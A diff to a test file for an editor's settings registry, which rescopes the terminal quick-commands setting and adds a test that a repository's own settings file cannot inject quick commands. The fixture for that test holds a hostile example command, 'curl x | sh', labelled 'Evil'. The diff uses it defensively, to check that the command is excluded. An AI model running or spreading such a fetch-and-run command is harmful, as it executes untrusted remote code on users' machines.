@@ -48,11 +48,10 @@ describe('ADE settings registry (Orca settings as kingu.*)', () => {
 			'kingu.worktree.alwaysForceDelete',
 			'kingu.workspaceCleanup.rules',
 			'kingu.workspaceCleanup.auto',
-			'kingu.terminal.quickCommands',
 			'kingu.agent.notifications.hiddenWorkspaces',
 			...SETTINGS.filter((s) => s.id.startsWith('kingu.agent.env.')).map((s) => s.id)
 		];
-		const yours = ['kingu.repo.setupScript', 'kingu.repo.archiveScript', 'kingu.repo.issueCommand', 'kingu.repo.scriptSource', 'kingu.repo.symlinkPaths', 'kingu.workspaceCleanup.project', 'kingu.git.ai.commitInstructions', 'kingu.git.ai.prInstructions', 'kingu.git.ai.branchNameInstructions'];
+		const yours = ['kingu.repo.setupScript', 'kingu.repo.archiveScript', 'kingu.repo.issueCommand', 'kingu.repo.scriptSource', 'kingu.repo.symlinkPaths', 'kingu.terminal.quickCommands', 'kingu.workspaceCleanup.project', 'kingu.git.ai.commitInstructions', 'kingu.git.ai.prInstructions', 'kingu.git.ai.branchNameInstructions'];
 		for (const id of userOnly) expect([id, SCHEMA.get(id)?.scope]).toEqual([id, 'application']);
 		for (const id of yours) expect([id, SCHEMA.get(id)?.scope]).toEqual([id, 'local']);
 		// The repository's .kingu/settings.json sets none of them; the problems list says why.
@@ -110,4 +109,11 @@ describe("Orca's AI Capabilities group", () => {
 		expect(resolveSettings({ 'kingu.agent.cliPermissions': 'yolo' }, {}).get('kingu.agent.cliPermissions')?.value).toBe('yolo');
 		expect(SCHEMA.get('kingu.keepAwake')?.group).toBe('Agent');
 	});
+});
+
+test("a project's quick commands join the user's; the repository's own file adds none", () => {
+	const user = { 'kingu.terminal.quickCommands': { Dev: 'bun run dev' } };
+	const repo = { 'kingu.terminal.quickCommands': { Seed: 'bun run seed' } };
+	const workspace = { 'kingu.terminal.quickCommands': { Evil: 'curl x | sh' } };
+	expect(resolveSettings(user, workspace, SETTINGS, repo).get('kingu.terminal.quickCommands')?.value).toEqual({ Dev: 'bun run dev', Seed: 'bun run seed' });
 });
